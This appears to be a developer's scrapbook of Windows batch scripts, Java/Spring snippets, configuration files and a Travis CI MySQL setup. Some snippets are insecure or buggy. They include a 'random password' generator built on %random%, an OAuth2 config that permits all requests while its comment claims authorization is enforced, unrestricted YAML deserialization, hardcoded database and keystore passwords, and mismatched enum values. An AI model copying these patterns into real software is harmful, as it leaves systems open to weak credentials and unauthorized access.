echo ----------------------------------------¬-----------------------
echo 1) 1 Random Password
echo 2) 5 Random Passwords
echo 3) 10 Random Passwords
echo Input your choice
set input=
set /p input= Choice:
if %input%==1 goto A if NOT goto Start2
if %input%==2 goto B if NOT goto Start2
if %input%==3 goto C if NOT goto Start2
:A
cls
echo Your password is %random%
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:Exit
exit
:B
cls
echo Your 5 passwords are %random%, %random%, %random%, %random%, %random%.
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:C
cls
echo Your 10 Passwords are %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
--------------------------------------------------------------------------------------------------------
@echo off
title Batch Calculator by seJma
color 1f
:top
echo --------------------------------------------------------------
echo Welcome to Batch Calculator
echo --------------------------------------------------------------
echo.
set /p sum=
set /a ans=%sum%
echo.
echo = %ans%
echo --------------------------------------------------------------
pause
cls
echo Previous Answer: %ans%
goto top
pause
exit
--------------------------------------------------------------------------------------------------------
	private static String toHash(Object obj) {
		return (obj == null ? "" : "@" + Integer.toHexString(System.identityHashCode(obj)));
	}
--------------------------------------------------------------------------------------------------------
java -Xmx64m -server \
  -cp target/classes:target/test-classes:lib/\* \
-Xrunhprof:cpu=samples,depth=10,verbose=n,interval=2 \
--------------------------------------------------------------------------------------------------------
System.out.println(ReflectionToStringBuilder.toString(user, ToStringStyle.MULTI_LINE_STYLE));
--------------------------------------------------------------------------------------------------------
GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}
--------------------------------------------------------------------------------------------------------
String propertiesFilename = "server.properties";
Properties prop = new Properties();
try (var inputStream = getClass().getClassLoader().getResourceAsStream(propertiesFilename)) {
    if (inputStream == null) {
        throw new FileNotFoundException(propertiesFilename);
    }
    prop.load(inputStream);
} catch (IOException e) {
    throw new RuntimeException(
                "Could not read " + propertiesFilename + " resource file: " + e);
}
--------------------------------------------------------------------------------------------------------
public class BookYAMLParser implements Parser<Book> {
    String filename;

    public BookYAMLParser(String filename) {
        this.filename = filename;
    }

    @Override
    public void serialize(Book book) {
        try {
            DumperOptions options = new DumperOptions();
            options.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
            Yaml yaml = new Yaml(options);
            FileWriter writer = new FileWriter(filename);
            yaml.dump(book, writer);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Book deserialize() {
        try {
            InputStream input = new FileInputStream(new File(filename));
            Yaml yaml = new Yaml();
            Book data = (Book) yaml.load(input);
            input.close();

            return data;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (YamlException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            String message = "Exception in file " + filename + ", ";
            throw new Exception(message + e.getMessage());
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
spring.main.web-application-type=none

server.port=8443
server.ssl.key-store=classpath:keystore.jks
server.ssl.key-store-password=secret
server.ssl.key-password=another-secret
--------------------------------------------------------------------------------------------------------
@Component
public class MyTomcatWebServerCustomizer
        implements WebServerFactoryCustomizer<TomcatServletWebServerFactory> {

    @Override
    public void customize(TomcatServletWebServerFactory factory) {
        // customize the factory here
    }
}
--------------------------------------------------------------------------------------------------------
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutionException;

import org.elasticsearch.action.delete.DeleteResponse;
import org.elasticsearch.action.get.GetResponse;
import org.elasticsearch.action.index.IndexRequest;
import org.elasticsearch.action.index.IndexResponse;
import org.elasticsearch.action.search.SearchResponse;
import org.elasticsearch.action.update.UpdateRequest;
import org.elasticsearch.action.update.UpdateResponse;
import org.elasticsearch.client.transport.TransportClient;
import org.elasticsearch.common.settings.Settings;
import org.elasticsearch.common.transport.TransportAddress;
import org.elasticsearch.common.xcontent.XContentType;
import org.elasticsearch.index.query.QueryBuilders;
import org.elasticsearch.search.SearchHit;
import org.elasticsearch.transport.client.PreBuiltTransportClient;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import com.example.demo.vo.InputObject;
import com.example.demo.vo.ResponseObject;

@Configuration
public class ElasticSearchDao {
	private static TransportClient client;

	@Bean
	public ElasticSearchDao elasticBean() {
		return new ElasticSearchDao();
	}

	public static TransportClient getElasticClient() throws UnknownHostException {
		System.setProperty("es.path.home", "D:\\target\\elasticsearch-6.1.2\\elasticsearch-6.1.2\\bin");
		if (client == null) {
			// node client
			/*
			 * Node node =
			 * nodeBuilder().clusterName("elasticsearch").client(true).node();
			 * client = node.client(); return client;
			 */
			// transport client
			client = new PreBuiltTransportClient(Settings.EMPTY)
					.addTransportAddress(new TransportAddress(InetAddress.getByName("localhost"), 9300))
					.addTransportAddress(new TransportAddress(InetAddress.getByName("localhost"), 9300));

			return client;
		} else
			return client;
	}

	public Object AddDocument(String input) throws UnknownHostException {
		ResponseObject responseObject = new ResponseObject();
		InputObject obj = processInput(input);
		if (!obj.isMalformed()) {
			TransportClient client = getElasticClient();
			IndexResponse response = null;
			try {
				response = client.prepareIndex(obj.getIndex(), obj.getIndex(), obj.getId())
						.setSource(obj.getData(), XContentType.JSON).get();
				responseObject.setSuccessMessage(response.getResult().name());
				responseObject.setId(response.getId());
				responseObject.setData(obj.getData());

			} catch (Exception ex) {
				System.out.println(ex.getMessage());
				responseObject.setErrorMessage("Exception In creation of Entity");
				return responseObject;
			}
			return responseObject;
		} else {
			responseObject.setErrorMessage("Malformed input json");
		}
		return responseObject;
	}

	public Object getSingalDocument(String index, String id) {
		ResponseObject responseObject = new ResponseObject();
		TransportClient client = null;
		GetResponse response = null;
		String docType = index;
		try {
			client = getElasticClient();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			responseObject.setErrorMessage("Exception In getting Elastic Transport Client");
			return responseObject;
		}
		// client.admin().indices().prepareRefresh().execute().actionGet();
		try {
			response = client.prepareGet(index, docType, id).get();
			if(response.getSourceAsString()==null ||response.getSourceAsString()=="")
			responseObject.setSuccessMessage("Not Found");
			else
				responseObject.setSuccessMessage("Fetched");
			responseObject.setId(response.getId());
			responseObject.setData(response.getSourceAsString());
		} catch (Exception ex) {
			responseObject.setErrorMessage("Exception In getting Elastic Data");
			return responseObject;
		}
		return responseObject;
	}

	public Object getAllDocments(String index) {
		ResponseObject responseObject = new ResponseObject();
		TransportClient client = null;
		SearchResponse response = null;
		List<Map<String, Map<String, Object>>> esData;
		Object obj = null;
		try {
			client = getElasticClient();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			responseObject.setErrorMessage("Exception In getting Elastic Transport Client");
			return responseObject;
		}
		// client.admin().indices().prepareRefresh().execute().actionGet();
		try {
			/*
			 * response = client.prepareSearch(index).get(); obj=response.ge;
			 */
			int scrollSize = 1000;
			esData = new ArrayList<Map<String, Map<String, Object>>>();
			int i = 0;
			while (response == null || response.getHits().getHits().length != 0) {
				response = client.prepareSearch(index).setTypes(index).setQuery(QueryBuilders.matchAllQuery())
						.setSize(scrollSize).setFrom(i * scrollSize).execute().actionGet();
				for (SearchHit hit : response.getHits()) {
					Map<String, Map<String, Object>> temp = new HashMap<String, Map<String, Object>>();
					temp.put(hit.getId(), hit.getSourceAsMap());
					esData.add(temp);
				}
				i++;
			}
			return esData;
		} catch (Exception ex) {
			responseObject.setErrorMessage("Exception In getting Elastic Data");
			return responseObject;
		}

	}

	public Object deleteDocument(String index, String id) {
		TransportClient client = null;
		ResponseObject responseObject = new ResponseObject();
		try {
			client = getElasticClient();
		} catch (UnknownHostException e) {
			e.printStackTrace();
			responseObject.setErrorMessage("Exception In getting Elastic Transport Client");
			return responseObject;
		}
		try {
			DeleteResponse response = client.prepareDelete(index, index, id).get();
			responseObject.setSuccessMessage(response.getResult().name());
			return responseObject;
		} catch (Exception ex) {
			responseObject.setErrorMessage("Exception In getting Elastic Data");
			return responseObject;
		}

	}

	public Object updateDocment(String input) {
		ResponseObject responseObject = new ResponseObject();
		InputObject inputObject = processInput(input);
		TransportClient client = null;
		Object obj = null;
		UpdateResponse response = null;
		if (!inputObject.isMalformed()) {
			try {
				client = getElasticClient();
			} catch (UnknownHostException e) {
				e.printStackTrace();
				responseObject.setErrorMessage("Exception In getting Elastic Transport Client");
				return responseObject;
			}
			IndexRequest indexRequest = new IndexRequest(inputObject.getIndex(), inputObject.getIndex(),
					inputObject.getId()).source(inputObject.getData(), XContentType.JSON);
			UpdateRequest updateRequest = new UpdateRequest(inputObject.getIndex(), inputObject.getIndex(),
					inputObject.getId()).doc(inputObject.getData(), XContentType.JSON).upsert(indexRequest);

			try {
				response = client.update(updateRequest).get();
				responseObject.setSuccessMessage(response.getResult().name());
				responseObject.setId(response.getId());
			} catch (InterruptedException | ExecutionException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				responseObject.setErrorMessage("Exception In updating Elastic data.");
				return responseObject;
			}
			return responseObject;
		} else {
			responseObject.setErrorMessage("Malformed input json");
		}
		return responseObject;
	}

	public static InputObject processInput(String input) {
		input = input.replaceAll("\\s", "");
		InputObject obj = null;
		JSONObject jsonObject = null;
		try {
			JSONParser parser = new JSONParser();
			jsonObject = (JSONObject) parser.parse(input);
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			obj = new InputObject("", "", "", true);
			e1.printStackTrace();

		}
		/*
		 * System.out.println(input); String index=input.substring(10);
		 * index=index.substring(0, index.indexOf('"')); String
		 * id=input.substring(input.indexOf("id")+5);
		 * id=id.substring(0,id.indexOf('"')); String
		 * data=input.substring(input.indexOf("data")+6,input.lastIndexOf('}'));
		 */

		try {
			/*
			 * System.out.println(jsonObject.get("index"));
			 * System.out.println(jsonObject.get("id"));
			 * System.out.println(jsonObject.get("data"));
			 */
			obj = new InputObject(jsonObject.get("index").toString(), jsonObject.get("id").toString(),
					jsonObject.get("data").toString(), false);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			obj = new InputObject("", "", "", true);
			e.printStackTrace();
		}
		;
		return obj;
	}

}

public class Book {
 private String title;
 private String Author;
 private String ISBN;
 private int count;
 
 public Book(String ISBN,String Authour,String title,int count){
	 this.ISBN=ISBN;
	 this.title=title;
	 this.count=count;
	 this.Author=Authour;
 }
 public String getTitle() {
	return title;
}
public void setTitle(String title) {
	this.title = title;
}
public String getAuthor() {
	return Author;
}
public void setAuthor(String author) {
	Author = author;
}
public String getISBN() {
	return ISBN;
}
public void setISBN(String iSBN) {
	ISBN = iSBN;
}

public int getCount() {
	return count;
}
public void setCount(int count) {
	this.count = count;
}
}
--------------------------------------------------------------------------------------------------------
    public enum Strategy {
        NONE {
            @Override
            public String toString() {
                return "drop-and-create";
            }
        },
        CREATE {
            @Override
            public String toString() {
                return "create";
            }
        },
        DROP_AND_CREATE {
            @Override
            public String toString() {
                return "drop-and-create";
            }
        }
    };
	
	public static Platform matchText(String text){
		text = text.toLowerCase();
		for(Platform a:Platform.values()){
			if(text.contains(a.keyword)){
				return a;
			}
		}
		return null;
	}
	
	public enum Language {
	English("EN"), Spanish("ES"), French("FR"), German("DE"), Dutch("NL"), Japanese(
			"JA"), Korean("KO"), Chinese("ZH"), Simplified_Chinese("zh-Hans") {
		@Override
		public String toString() {
			return "Simplified Chinese";
		}
	},
	Traditional_Chinese("zh-Hant") {
		@Override
		public String toString() {
			return "Traditional Chinese";
		}
	},
	Russian("RU");

	private String keyword;

	private Language(String code) {
		this.keyword = code;
	}
	
	public static Language getEnum(String val){
		for(Language key: Language.values()){
			if(key.keyword.equalsIgnoreCase(val)){
				return key;
			}
		}
		return null;
	}
	
	public String getKeyword(){
		return this.keyword;
	}
}

public enum KeyEnum {
	//device_size("device size"),
	source("sources"),
	language("language"),
	apple_product_line("apple_product_line"),
	platform("platform"),
	device_os_version("device_os_version"),
	device_manufacturer("device_manufacturer"),	
	device_type("device_type"),
	device_size("device_size"),
	geoip_continent("geoip_continent"),
	geoip_country("geoip_country"),
	geoip_region("regions"),
	//Always put personas in the end
	persona_name("personas");
	
	private final String keyword;
	
	private KeyEnum(String key){
		this.keyword = key;
	}
	
	public static KeyEnum getEnum(String val){
		for(KeyEnum key: KeyEnum.values()){
			if(key.keyword.equalsIgnoreCase(val)){
				return key;
			}
		}
		return null;
	}
	
	public static String getValue(KeyEnum key){
		return key.keyword;
	}
}

public enum Countries {
	// RW - rest of world
	AR("Argentina"), AU("Australia"), BR("Brazil"), CA("Canada"), CL("Chile"), CN("China"), 
	CO("Colombia"), DE("Germany"), ES("Spain"), FR("France"), GB("United Kingdom"), GR("Greece"), 
	HK("Hong Kong"), ID("Indonesia"), IL("Israel"), IN("India"), IT("Italy"), JP("Japan"), KR("Korea"),
	KW("Kuwait"), MX("Mexico"), MY("Malaysia"), NL("Netherlands"), RU("Russia"), SA("Saudi Arabia"), 
	SE("Sweden"), SG("Singapore"), TH("Thailand"), TR("Turkey"), TW("Taiwan"), US("United States");

	private String keyword;
	
	private Countries(String k) {
		this.keyword = k;
	}
	
	public static Countries getEnum (String country) {
		for (Countries c : Countries.values()) {
			if (c.name().equalsIgnoreCase(country)) {
				return c;
			}
		}
		return null;
	}
	
	public String getKeyword(){
		return keyword;
	}
}

public enum Continents {
	SA("South America"), AS("Asia"), AF("Africa"), EU("Europe"), OC("Oceania"), NA("North America");
	
	private String keyword;
	
	private Continents(String k) {
		this.keyword = k;
	}

	public static Continents getEnum(String continent) {
		for (Continents c : Continents.values()) {
			if (c.name().equalsIgnoreCase(continent)) {
				return c;
			}
		}
		return null;
	}
	
	public String getKeyword(){
		return keyword;
	}

}
--------------------------------------------------------------------------------------------------------
server.port = 8082
server.ssl.key-store = classpath:keystore.p12
server.ssl.key-store-password = mypassword
server.ssl.key-store-type = PKCS12
server.ssl.key-alias = tomcat
--------------------------------------------------------------------------------------------------------
import javax.sql.DataSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Primary;
import org.springframework.core.env.Environment;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.oauth2.config.annotation.web.configuration.ResourceServerConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configurers.ResourceServerSecurityConfigurer;
import org.springframework.security.oauth2.provider.token.DefaultTokenServices;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JdbcTokenStore;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.PropertySource;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;


/**
 * Configure OAuth2 so that:
 *   . Token checking is done by comparing with key that retrieved from
 *     jdbc database
 *   . Any request need be authroized via access token key provided
 */
@Configuration
@PropertySource({"classpath:oauth2jdbc.properties"})
@EnableResourceServer
public class OAuth2ResourceServerConfig extends ResourceServerConfigurerAdapter {
  @Autowired
  private Environment env;

  @Override
  public void configure(final HttpSecurity http) throws Exception {
    http.sessionManagement()
    .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
    .and()
    .authorizeRequests().anyRequest().permitAll();
  }

  @Override
  public void configure(final ResourceServerSecurityConfigurer config) {
    config.tokenServices(tokenServices());
  }

  @Bean
  @Primary
  public DefaultTokenServices tokenServices() {
    final DefaultTokenServices defaultTokenServices = new DefaultTokenServices();
    defaultTokenServices.setTokenStore(tokenStore());
    return defaultTokenServices;
  }

  private DataSource getJDBCdataSource() {
    final DriverManagerDataSource dataSource = new DriverManagerDataSource();
    dataSource.setDriverClassName(env.getProperty("jdbc.driverClassName"));
    dataSource.setUrl(env.getProperty("jdbc.url"));
    dataSource.setUsername(env.getProperty("jdbc.user"));
    dataSource.setPassword(env.getProperty("jdbc.pass"));
    return dataSource;
  }

  @Bean
  public TokenStore tokenStore() {
    return new JdbcTokenStore(getJDBCdataSource());
  }
}

import org.springframework.context.annotation.Configuration;
import org.springframework.security.access.expression.method.MethodSecurityExpressionHandler;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration;
import org.springframework.security.oauth2.provider.expression.OAuth2MethodSecurityExpressionHandler;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;


/**
 * Enable security check with @PreAuthorize annotation to enforce
 * authorization on Rest Controller on method of class controller
 */
@Configuration
@EnableResourceServer
@EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled= true)
public class MethodSecurityConfig extends GlobalMethodSecurityConfiguration {
  @Override
  protected MethodSecurityExpressionHandler createExpressionHandler() {
    return new OAuth2MethodSecurityExpressionHandler();
  }
}

--------------------------------------------------------------------------------------------------------
@Pattern(regexp="[\\p{IsAlphabetic}\\s]*")
--------------------------------------------------------------------------------------------------------
import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.Status;
import javax.ws.rs.ext.ExceptionMapper;
import javax.ws.rs.ext.Provider;

import com.target.model.ErrorMessage;


@Provider
public class UpdateExceptionMapper implements ExceptionMapper<UpdateException> {

	@Override
	public Response toResponse(UpdateException exception) {
		return Response.status(Status.NOT_MODIFIED)
				.entity(new ErrorMessage("array index out of bound exception", 400, "wwwelham"))
				.build();
	}
}
--------------------------------------------------------------------------------------------------------
		@DurationUnit(ChronoUnit.SECONDS)
		private Duration backgroundProcessorDelay = Duration.ofSeconds(10);
--------------------------------------------------------------------------------------------------------
		private String internalProxies = "10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|" // 10/8
				+ "192\\.168\\.\\d{1,3}\\.\\d{1,3}|" // 192.168/16
				+ "169\\.254\\.\\d{1,3}\\.\\d{1,3}|" // 169.254/16
				+ "127\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|" // 127/8
				+ "172\\.1[6-9]{1}\\.\\d{1,3}\\.\\d{1,3}|" // 172.16/12
				+ "172\\.2[0-9]{1}\\.\\d{1,3}\\.\\d{1,3}|" + "172\\.3[0-1]{1}\\.\\d{1,3}\\.\\d{1,3}|" //
				+ "0:0:0:0:0:0:0:1|::1";
--------------------------------------------------------------------------------------------------------
//@Configuration
//public class JsonPathConfig {
//    static {
//        // disable JsonPath cache to avoid
//        // to use first parsed value always when "concat(...)"
//        CacheProvider.setCache(new NOOPCache());
//    }
//
//    public com.jayway.jsonpath.Configuration getConfig() {
//        return com.jayway.jsonpath.Configuration.defaultConfiguration()
//                        .addOptions(Option.SUPPRESS_EXCEPTIONS);
//    }
//}
--------------------------------------------------------------------------------------------------------
    @Bean
    @Description("Ticket message kafka transaction manager bean")
    public KafkaTransactionManager<String, TicketMessage> ticketMessageTransactionManager() {
        return new KafkaTransactionManager<>(this.ticketMessageProducerFactory());
    }
--------------------------------------------------------------------------------------------------------
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.springframework.stereotype.Component;

@Component
public class NameValidator {

    private static final String NAME_PATTERN = "^[a-zA-Z0-9\\._\\s\\-]+$";

    public boolean isValidName(final String name) {
        final Pattern pattern = Pattern.compile(NAME_PATTERN);
        final Matcher matcher = pattern.matcher(name);
        return matcher.matches();
    }

}

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import com.redsky.client.exception.ResourceValidationException;
import com.redsky.client.pojo.RequestPayload;

@Component
public class InputRequestValidator implements RequestValidator<RequestPayload> {

    @Autowired
    private BeanValidator validator;

    @Autowired
    private NameValidator nameValidator;

    @Override
    public boolean validate(final RequestPayload bean) throws ResourceValidationException {
        boolean result = false;
        if (bean != null) {
            result = validator.validate(bean);
        }
        if (result) {
            result = nameValidator.isValidName(bean.getProduct().getName());
        }

        return result;
    }

}
--------------------------------------------------------------------------------------------------------
@Bean
public FilterRegistrationBean registration(MyFilter filter) {
    FilterRegistrationBean registration = new FilterRegistrationBean(filter);
    registration.setEnabled(false);
    return registration;
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.confirmationlink.callback.deserializer;

import com.google.protobuf.InvalidProtocolBufferException;
import com.google.protobuf.StringValue;
import com.paragon.microservices.confirmationlink.callback.exception.AuthorityRedisDataException;
import com.paragon.microservices.confirmationlink.callback.system.deserializer.AuthorityRedisValueDeserializer;
import org.apache.commons.lang3.StringUtils;
import org.hamcrest.core.IsEqual;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.ArgumentMatchers;
import org.powermock.api.mockito.PowerMockito;
import org.powermock.core.classloader.annotations.PrepareForTest;
import org.powermock.modules.junit4.PowerMockRunner;

import static com.paragon.microservices.confirmationlink.callback.TestUtils.checkThrows;
import static org.hamcrest.CoreMatchers.startsWith;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.core.Is.is;
import static org.hamcrest.core.IsNull.nullValue;

@RunWith(PowerMockRunner.class)
@PrepareForTest(StringValue.class)
public class AuthorityRedisValueDeserializerTest {

    private AuthorityRedisValueDeserializer serializer;

    @Before
    public void setUp() {
        this.serializer = new AuthorityRedisValueDeserializer();
    }

    @Test
    public void test_serialize() {
        // given
        final String errorMessage = "Serialize operation isn't supported!";

        // when
        final UnsupportedOperationException thrown = checkThrows(UnsupportedOperationException.class, () -> this.serializer.serialize("test data"));
        // then
        assertThat(thrown.getMessage(), IsEqual.equalTo(errorMessage));
    }

    @Test
    public void test_deserialize_whenPassed_NullableContent() {
        // given
        final byte[] content = null;

        // when
        final String actual = this.serializer.deserialize(content);

        // then
        assertThat(actual, is(nullValue()));
    }

    @Test
    public void test_deserialize_whenPassed_EmptyContent() {
        // given
        final String content = StringUtils.EMPTY;

        // when
        final String actual = this.serializer.deserialize(content.getBytes());

        // then
        assertThat(actual, is(content));
    }

    @Test
    public void test_deserialize_whenPassed_InvalidContent() {
        // given
        final String errorMessage = "ERROR: cannot parse authority redis data";
        final String content = "{\n" +
                "  \"reportId\": \"123\",\n" +
                "  \"locale\": \"de_DE\",\n" +
                "  \"kind\": \"PRODUCTS_BATCH\",\n" +
                "  \"mode\": \"DRY_RUN\"\n" +
                "}";

        // when
        final AuthorityRedisDataException thrown = checkThrows(AuthorityRedisDataException.class, () -> this.serializer.deserialize(content.getBytes()));
        // then
        assertThat(thrown.getMessage(), startsWith(errorMessage));
    }

    @Test
    public void test_deserialize_whenPassed_ValidContent() throws InvalidProtocolBufferException {
        // given
        final String content = "/xa1/xs2{\"reportId\": \"123\"}";
        final String deserializeResult = "{\"reportId\": \"123\"}";

        PowerMockito.mockStatic(StringValue.class);

        final StringValue stringValue = PowerMockito.mock(StringValue.class);
        PowerMockito.when(StringValue.parseFrom(ArgumentMatchers.eq(content.getBytes()))).thenReturn(stringValue);
        PowerMockito.when(stringValue.getValue()).thenReturn(deserializeResult);

        // when
        final String actual = this.serializer.deserialize(content.getBytes());

        // then
        assertThat(deserializeResult, IsEqual.equalTo(actual));
    }

    @Test
    public void test_deserialize_whenPassed_BadContent() {
        // given
        final String errorMessage = "ERROR: cannot parse authority redis data";
        final String content = "{}";

        // when
        final AuthorityRedisDataException thrown = checkThrows(AuthorityRedisDataException.class, () -> this.serializer.deserialize(content.getBytes()));
        // then
        assertThat(thrown.getMessage(), startsWith(errorMessage));
    }
}
--------------------------------------------------------------------------------------------------------
import java.util.LinkedHashSet;
import java.util.Set;

import javax.annotation.PostConstruct;
import javax.validation.ConstraintViolation;
import javax.validation.Validation;
import javax.validation.ValidationException;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;

import org.springframework.stereotype.Component;

import com.redsky.client.exception.ResourceValidationException;

@Component
public class BeanValidator {

    private ValidatorFactory factory;
    private Validator validator;

    @PostConstruct
    public void init() throws ResourceValidationException {
        try {
            factory = Validation.buildDefaultValidatorFactory();
        } catch (final ValidationException e) {
            throw new ResourceValidationException("Couldn't build ValidatorFactory ", e);
        }
        validator = factory.getValidator();
    }

    public boolean validate(final Object bean) throws ResourceValidationException {

        final Set<String> messages = new LinkedHashSet<>();

        if (bean == null) {
            messages.add("Bean is null, can't validate bean");
        } else {
            final Set<ConstraintViolation<Object>> violations = validator.validate(bean);
            if (violations != null) {
                for (final ConstraintViolation<Object> violation : violations) {
                    messages.add(violation.getMessage());
                }
            }
        }
        if (!messages.isEmpty()) { throw new ResourceValidationException("Validation error", messages); }

        return true;
    }
}
--------------------------------------------------------------------------------------------------------
spring:
  profiles: default
  application:
    name: redsky-client-service
    
server:
  port: 8082
  servlet:
    context-path: /rcs

    
httpconfig:
  maxHttpConnections: 50
  maxHttpConnectionsPerRoute: 30
  connectionTimeout: 8000
  connectionRequestTimeout: 8000 
  socketTimeout: 20000
  maxHttpRetries: 4
  
redsky:
  producturl: http://redsky.com/product
  priceurl: http://redsky.com/price
--------------------------------------------------------------------------------------------------------

import java.util.List;

import org.springframework.data.mongodb.repository.MongoRepository;
import org.springframework.data.repository.query.Param;
import org.springframework.data.rest.core.annotation.RepositoryRestResource;

import com.example.entity.Pricing;
import com.example.entity.CurrentPricing;

@RepositoryRestResource(collectionResourceRel = "pricing", path = "pricing")
public interface PricingRepo extends MongoRepository<Pricing, String> {

	Pricing findByProductID(@Param("ProductID") long ProductID);
	
}
--------------------------------------------------------------------------------------------------------
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

// NOT THREADSAFE
public class BankAccountUnsynchronized {

  private double balance;
  private Lock lock = new ReentrantLock();

  public BankAccountUnsynchronized() {
    balance = 0;
  }

  public void deposit(double amount) {
      //Second solution:
      lock.lock();
      try {
          balance += amount;
      } finally {
          lock.unlock();
      }
   }

  public void withdraw(double amount) {
      //Second solution.
      lock.lock();
      try {
          balance -= amount;
      } finally {
          lock.unlock();
      }
   }

  public double getBalance() {
    return balance;
  }
}
--------------------------------------------------------------------------------------------------------
//import com.wildbeeslabs.api.rest.security.service.interfaces.IEncryptionService;
//import org.jasypt.util.password.StrongPasswordEncryptor;
//import org.springframework.beans.factory.annotation.Autowired;
//import org.springframework.stereotype.Service;
//
///**
// *
// * Encryption REST Application Service implementation
// *
// * @author Alex
// * @version 1.0.0
// * @since 2017-08-08
// */
//@Service("userAccountService")
//public class EncryptionServiceImpl implements IEncryptionService {
//
//    @Autowired
//    private StrongPasswordEncryptor strongEncryptor;
//
//    @Override
//    public String encrypt(final String input) {
//        return strongEncryptor.encryptPassword(input);
//    }
//
//    @Override
//    public boolean check(final String plainInput, final String encryptedInput) {
//        return strongEncryptor.checkPassword(plainInput, encryptedInput);
//    }
//}
--------------------------------------------------------------------------------------------------------
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class Tester {

  static final int NUMBER_OF_TURNSTILES = 40;
  static Turnstile[] turnStiles = new Turnstile[NUMBER_OF_TURNSTILES];

  public static void main(String[] args) throws InterruptedException {
    //This is the shared Counter used by all turnstilles
    TurnstileCounter sharedCounter = new TurnstileCounter();

    for (int i = 0; i < NUMBER_OF_TURNSTILES; i++) {
      turnStiles[i] = new Turnstile(sharedCounter);
    }

    //This example uses a ThreadPool to handle threads
    ExecutorService es = Executors.newCachedThreadPool();

    for (int i = 0; i < NUMBER_OF_TURNSTILES; i++) {
      es.execute(turnStiles[i]);
    }

    es.shutdown();
    es.awaitTermination(10, TimeUnit.SECONDS);

    System.out.println("All turnstiles are done");
    //Print the updated value
    System.out.println(sharedCounter.getValue());
  }
}

--------------------------------------------------------------------------------------------------------
## SETUP file for Travis
## Make sure to rename the database name in the CREATE DATABASE script below to the SAME name as used for your local tests
---

dist: bionic

language: java

cache:
  directories:  
    - $HOME/.m2

script:
  - mvn test
  - mvn -Dremote.user=$REMOTE_USER -Dremote.password=$REMOTE_PW tomcat7:undeploy
  - mvn -Dremote.user=$REMOTE_USER -Dremote.password=$REMOTE_PW tomcat7:deploy

services:
   - mysql

before_script:

# TODO Add variable to make it simple to be reusable for all semester projects
#- export DEBIAN_FRONTEND="noninteractive";
#- PW="ax2"
#- USER_NAME="dev"

#- sudo apt-get clean
#- sudo rm -r /var/lib/apt/lists/*

- sudo apt-get update
- sudo apt-get install -y debconf-utils
- sudo debconf-set-selections <<< 'mysql-apt-config mysql-apt-config/select-server select mysql-8.0'
- wget https://dev.mysql.com/get/mysql-apt-config_0.8.13-1_all.deb
- sudo -E dpkg -i mysql-apt-config_0.8.13-1_all.deb
- sudo apt-get update

- echo "Installing MySQL 8..."
- sudo -E apt-get -y install mysql-server

- sudo mysql -u root -e "CREATE User 'dev'@'localhost' IDENTIFIED BY 'ax2'; GRANT ALL PRIVILEGES ON *.* TO 'dev'@'localhost' WITH GRANT OPTION;"
# - sudo mysql -u root -e "CREATE DATABASE startcodev2-test;"
- sudo mysql -u dev -pax2 -e "CREATE DATABASE startcode;"

- echo "Change  port to 3307, to mirror the local development setup"
- sudo systemctl stop mysql
- sudo sh -c 'echo "port=3307" >> /etc/mysql/mysql.conf.d/mysqld.cnf'
- echo "Restarting MySQL..."
- sudo systemctl start mysql
- mysql --version
- echo "before_script Complete"
--------------------------------------------------------------------------------------------------------
		<dependency>
   			 <groupId>org.elasticsearch</groupId>
    		<artifactId>elasticsearch</artifactId>
   			 <version>6.1.0</version>
		</dependency> 
		<dependency>
